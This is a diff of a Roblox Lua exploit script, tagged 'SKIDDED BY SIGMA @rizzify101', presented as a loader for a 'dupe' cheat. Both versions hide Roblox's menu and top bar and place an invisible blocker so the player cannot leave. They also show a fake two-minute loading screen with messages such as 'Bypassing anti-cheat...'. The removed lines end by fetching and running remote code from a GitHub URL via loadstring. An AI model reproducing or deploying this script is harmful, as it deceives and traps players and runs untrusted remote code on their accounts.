@@ -1,100 +1,85 @@
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+
+--// Destroy old GUI if exists
 pcall(function()
 	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
 		game.CoreGui.AntiLeaveBlocker:Destroy()
 	end
 end)
 
-
+--// Optional: Block top-left UI / prevent escape
 local BLOCK_SIZE_X = 56
 local BLOCK_SIZE_Y = 56
 local BLOCK_POS_X  = 6
 local BLOCK_POS_Y  = 6
 local DISPLAY_ORDER = 10000
 
-
 local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
 
-
+-- Try to block Roblox UI
 local function tryHideRobloxMenu()
 	pcall(function()
 		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
-		for _, n in ipairs(names) do
-			local g = CoreGui:FindFirstChild(n)
+		for _, name in ipairs(names) do
+			local g = CoreGui:FindFirstChild(name)
 			if g then
-				pcall(function()
-					if g:IsA("ScreenGui") then
-						g.Enabled = false
-						for _, c in ipairs(g:GetChildren()) do
-							pcall(function() c.Visible = false end)
-							pcall(function() c.Enabled = false end)
-						end
-					else
-						for _, c in ipairs(g:GetDescendants()) do
-							pcall(function()
-								if c:IsA("GuiObject") then
-									c.Position = UDim2.new(-10,0,-10,0)
-								end
-							end)
-						end
+				if g:IsA("ScreenGui") then
+					g.Enabled = false
+					for _, c in ipairs(g:GetChildren()) do
+						pcall(function() c.Visible = false end)
+						pcall(function() c.Enabled = false end)
 					end
-				end)
+				end
 			end
 		end
 	end)
 end
 
+-- Anti-leave overlay
+local antiLeaveGui = Instance.new("ScreenGui", CoreGui)
+antiLeaveGui.Name = "AntiLeaveBlocker"
+antiLeaveGui.ResetOnSpawn = false
+antiLeaveGui.IgnoreGuiInset = true
+antiLeaveGui.DisplayOrder = DISPLAY_ORDER
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AntiLeaveBlocker"
-screenGui.Parent = CoreGui
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.DisplayOrder = DISPLAY_ORDER
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+local blockerFrame = Instance.new("Frame", antiLeaveGui)
+blockerFrame.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
+blockerFrame.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+blockerFrame.BackgroundTransparency = 1
 
-local container = Instance.new("Frame")
-container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
-container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
-container.BackgroundTransparency = 1
-container.BorderSizePixel = 0
-container.Parent = screenGui
-
-local blocker = Instance.new("TextButton")
+local blocker = Instance.new("TextButton", blockerFrame)
 blocker.Size = UDim2.new(1, 0, 1, 0)
 blocker.BackgroundTransparency = 1
-blocker.AutoButtonColor = false
 blocker.Text = ""
-blocker.Parent = container
-blocker.Active = true
+blocker.AutoButtonColor = false
 blocker.Selectable = false
-
-blocker.MouseButton1Down:Connect(function() end)
-blocker.MouseButton1Up:Connect(function() end)
-blocker.MouseButton2Down:Connect(function() end)
-blocker.MouseButton2Up:Connect(function() end)
-
+blocker.Active = true
 
 RunService.RenderStepped:Connect(function()
-	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+	blockerFrame.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
 end)
 
-
 spawn(function()
-	while screenGui.Parent and screenGui.Parent == CoreGui do
+	while antiLeaveGui.Parent == CoreGui do
 		tryHideRobloxMenu()
 		wait(2)
 	end
 end)
 
---// Full-Screen Animated Loading Screen (Looping Messages)
---// Place inside StarterPlayerScripts
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
 
+--// Fullscreen Loading Overlay
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
 local player = Players.LocalPlayer
 
--- Create ScreenGui overlay
+-- GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "FullLoadingOverlay"
 screenGui.IgnoreGuiInset = true
@@ -103,27 +88,24 @@ screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 screenGui.DisplayOrder = 999999
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Fullscreen background
-local bg = Instance.new("Frame")
+-- Background
+local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-bg.BackgroundTransparency = 0
-bg.Parent = screenGui
 
--- Center “Loading...” text
-local text = Instance.new("TextLabel")
-text.AnchorPoint = Vector2.new(0.5, 0.5)
-text.Position = UDim2.new(0.5, 0, 0.45, 0)
-text.Size = UDim2.new(0, 600, 0, 80)
-text.Text = "Loading..."
-text.TextColor3 = Color3.fromRGB(255, 255, 255)
-text.Font = Enum.Font.GothamBold
-text.TextScaled = true
-text.BackgroundTransparency = 1
-text.Parent = bg
+-- Main Text
+local mainText = Instance.new("TextLabel", bg)
+mainText.AnchorPoint = Vector2.new(0.5, 0.5)
+mainText.Position = UDim2.new(0.5, 0, 0.45, 0)
+mainText.Size = UDim2.new(0, 600, 0, 80)
+mainText.Text = "Loading..."
+mainText.TextColor3 = Color3.new(1,1,1)
+mainText.Font = Enum.Font.GothamBold
+mainText.TextScaled = true
+mainText.BackgroundTransparency = 1
 
 -- Subtext
-local subText = Instance.new("TextLabel")
+local subText = Instance.new("TextLabel", bg)
 subText.AnchorPoint = Vector2.new(0.5, 0)
 subText.Position = UDim2.new(0.5, 0, 0.55, 0)
 subText.Size = UDim2.new(0, 400, 0, 40)
@@ -132,89 +114,80 @@ subText.TextColor3 = Color3.fromRGB(200, 200, 200)
 subText.Font = Enum.Font.Gotham
 subText.TextScaled = true
 subText.BackgroundTransparency = 1
-subText.Parent = bg
 
--- Progress bar background
-local barFrame = Instance.new("Frame")
+-- Progress Bar
+local barFrame = Instance.new("Frame", bg)
 barFrame.AnchorPoint = Vector2.new(0.5, 0)
 barFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
 barFrame.Size = UDim2.new(0, 400, 0, 10)
 barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barFrame.Parent = bg
 Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 6)
 
--- Progress bar fill
-local barFill = Instance.new("Frame")
+local barFill = Instance.new("Frame", barFrame)
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-barFill.Parent = barFrame
 Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 6)
 
--- Blur effect
-local blur = Instance.new("BlurEffect")
+-- Blur
+local blur = Instance.new("BlurEffect", Lighting)
 blur.Size = 0
-blur.Parent = game:GetService("Lighting")
-TweenService:Create(blur, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {Size = 20}):Play()
+TweenService:Create(blur, TweenInfo.new(1.5), {Size = 20}):Play()
 
--- Messages to loop through
+-- Messages
 local messages = {
-	"Loading the script...",
-	"Bypassing anti-cheat...",
-	"Looking for old servers...",
+	"-- SKIDDED BY SIGMA @rizzify101 --",
+	"Bypassing everything...",
+	"Compiling Rayfield...",
+	"Injecting fun...",
+	"Setting up UI...",
 	"Optimizing memory usage...",
-	"Decrypting modules...",
-	"Finalizing setup..."
+	"Finalizing UI layout...",
+	"Checking script integrity...",
+	"Almost there...",
+	"-- SKIDDED BY SIGMA @rizzify101 --"
 }
 
--- Helper function for smooth text transitions
-local function showMessage(message, holdTime)
-	text.TextTransparency = 1
-	text.Text = message
-	local fadeIn = TweenService:Create(text, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0})
-	local fadeOut = TweenService:Create(text, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 1})
-
-	fadeIn:Play()
-	fadeIn.Completed:Wait()
-	task.wait(holdTime)
-	fadeOut:Play()
-	fadeOut.Completed:Wait()
-end
-
--- Run looping messages in background
 local loopActive = true
 task.spawn(function()
 	while loopActive and screenGui.Parent do
 		for _, msg in ipairs(messages) do
-			showMessage(msg, 2.2)
-			if not loopActive then break end
+			mainText.TextTransparency = 1
+			mainText.Text = msg
+			local fadeIn = TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency = 0})
+			local fadeOut = TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency = 1})
+			fadeIn:Play()
+			fadeIn.Completed:Wait()
+			wait(2.2)
+			fadeOut:Play()
+			fadeOut.Completed:Wait()
 		end
 	end
 end)
 
--- Progress bar timing (controls total loading time)
-local totalTime = 100 -- seconds; adjust this for total duration
-local tween = TweenService:Create(barFill, TweenInfo.new(totalTime, Enum.EasingStyle.Quad), {Size = UDim2.new(1, 0, 1, 0)})
-tween:Play()
-tween.Completed:Wait()
+-- Progress bar animation
+local loadDuration = 120 -- seconds (2 minutes)
+TweenService:Create(barFill, TweenInfo.new(loadDuration), {
+	Size = UDim2.new(1, 0, 1, 0)
+}):Play()
 
--- Stop looping when done
+wait(loadDuration)
 loopActive = false
 
--- Fade out everything
-task.wait(0.5)
+-- Fade out GUI
 local fadeTime = 1.5
 TweenService:Create(bg, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
-TweenService:Create(text, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
+TweenService:Create(mainText, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
 TweenService:Create(subText, TweenInfo.new(fadeTime), {TextTransparency = 1}):Play()
 TweenService:Create(barFrame, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
 TweenService:Create(barFill, TweenInfo.new(fadeTime), {BackgroundTransparency = 1}):Play()
 TweenService:Create(blur, TweenInfo.new(fadeTime), {Size = 0}):Play()
 
-task.wait(fadeTime + 0.5)
+wait(fadeTime + 0.5)
 
--- Cleanup
+-- Clean up
 blur:Destroy()
 screenGui:Destroy()
 
--- Finally, load external script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/makagago11/Plantvsbrainrot/refs/heads/main/PvbDUPE"))()
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
+-- SKIDDED BY SIGMA @rizzify101
